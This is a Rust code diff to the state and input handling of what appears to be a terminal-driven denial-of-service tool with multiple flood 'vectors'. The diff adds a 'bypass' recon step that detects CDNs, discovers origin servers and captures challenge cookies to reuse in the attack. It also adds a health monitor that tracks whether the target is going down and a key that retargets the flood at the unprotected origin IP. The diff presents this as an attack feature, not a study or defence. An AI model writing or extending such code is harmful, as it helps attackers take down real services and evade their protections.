@@ -1,7 +1,7 @@
 //! Application state and input handling.
 
 use std::collections::VecDeque;
-use std::sync::atomic::AtomicU32;
+use std::sync::atomic::{AtomicBool, AtomicU32};
 use std::sync::Arc;
 use std::time::Instant;
 
@@ -9,6 +9,8 @@ use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
 use tokio::sync::mpsc;
 
 use crate::attack::{self, Ctx};
+use crate::bypass;
+use crate::health::{self, Health};
 use crate::net::raw::{self, Iface, RawSock};
 use crate::stats::Stats;
 use crate::target::{self, Target};
@@ -51,9 +53,13 @@ pub struct App {
     pub started_at: Option<Instant>,
     pub deadline: Option<Instant>,
     pub limit_secs: u64,
+    pub health: Option<Arc<Health>>,
+    pub recon: Option<Arc<bypass::Recon>>,
     samples: VecDeque<(Instant, u64, u64)>,
     scan_rx: Option<mpsc::Receiver<ScanOutcome>>,
     port_rx: Option<mpsc::UnboundedReceiver<u16>>,
+    recon_rx: Option<mpsc::Receiver<bypass::Recon>>,
+    health_stop: Option<Arc<AtomicBool>>,
 }
 
 impl App {
@@ -105,6 +111,10 @@ impl App {
             samples: VecDeque::new(),
             scan_rx: None,
             port_rx: None,
+            recon_rx: None,
+            health_stop: None,
+            health: None,
+            recon: None,
         }
     }
 
@@ -275,6 +285,21 @@ impl App {
                     if self.auto_mode { "auto" } else { "manual" }
                 );
                 self.phase = Phase::Ready;
+
+                // Recon runs after the target is known: CDN detection, origin
+                // discovery and challenge handling.
+                let ips = self.target.as_ref().map(|t| t.ips.clone()).unwrap_or_default();
+                if let Some(t) = &self.target {
+                    let port = t.port.unwrap_or(if t.tls { 443 } else { 80 });
+                    let tls = t.tls;
+                    let host = t.host.clone();
+                    let (tx, rx) = mpsc::channel(1);
+                    self.recon_rx = Some(rx);
+                    tokio::spawn(async move {
+                        let r = bypass::run(&ips, port, tls, &host).await;
+                        let _ = tx.send(r).await;
+                    });
+                }
             }
             Err(e) => {
                 self.note(format!("scan failed: {e}"));
@@ -282,6 +307,18 @@ impl App {
                 self.phase = Phase::Input;
             }
         }
+    }
+
+    pub fn poll_recon(&mut self) {
+        let Some(rx) = self.recon_rx.as_mut() else {
+            return;
+        };
+        let Some(r) = rx.try_recv().ok() else {
+            return;
+        };
+        self.recon_rx = None;
+        self.note(format!("recon: {}", bypass::summary(&r)));
+        self.recon = Some(Arc::new(r));
     }
 
     pub fn begin_attack(&mut self) {
@@ -321,11 +358,18 @@ impl App {
             iface: self.iface.clone(),
             raw,
             stats: stats.clone(),
+            cookie: self.recon.as_ref().and_then(|r| r.cookie.clone()),
             budgets: ALL
                 .iter()
                 .map(|s| Arc::new(attack::Budget::new(attack::raw_rate(s.vector))))
                 .collect(),
         });
+
+        let h = Arc::new(Health::new());
+        let stop = Arc::new(AtomicBool::new(false));
+        health::spawn(h.clone(), ip, port, stop.clone());
+        self.health = Some(h);
+        self.health_stop = Some(stop);
 
         self.note(format!(
             "attacking {ip}:{port} with {} vectors{}",
@@ -353,6 +397,9 @@ impl App {
         if let Some(s) = &self.stats {
             s.stop();
         }
+        if let Some(s) = &self.health_stop {
+            s.store(true, std::sync::atomic::Ordering::Relaxed);
+        }
         self.deadline = None;
         self.phase = Phase::Stopped;
         self.message = "stopped - Enter to restart, Esc to edit target".into();
@@ -365,6 +412,7 @@ impl App {
     }
 
     pub fn tick(&mut self) {
+        self.poll_recon();
         if self.phase == Phase::Running {
             if let Some(d) = self.deadline {
                 if Instant::now() >= d {
@@ -486,6 +534,25 @@ impl App {
             KeyCode::Char(c @ '1'..='7') => {
                 let layer = format!("L{c}");
                 self.toggle_layer(&layer);
+            }
+            KeyCode::Char('o') => {
+                let ip = self.recon.as_ref().and_then(|r| r.origins.first().copied());
+                match ip {
+                    Some(ip) => {
+                        if let Some(t) = self.target.as_mut() {
+                            t.ips = vec![ip];
+                        }
+                        self.note(format!("retargeted to origin {ip}"));
+                        self.message = format!("targeting origin {ip} directly");
+                    }
+                    None => {
+                        self.message = if self.recon.is_some() {
+                            "no origin found".into()
+                        } else {
+                            "recon still running".into()
+                        }
+                    }
+                }
             }
             _ => {}
         }
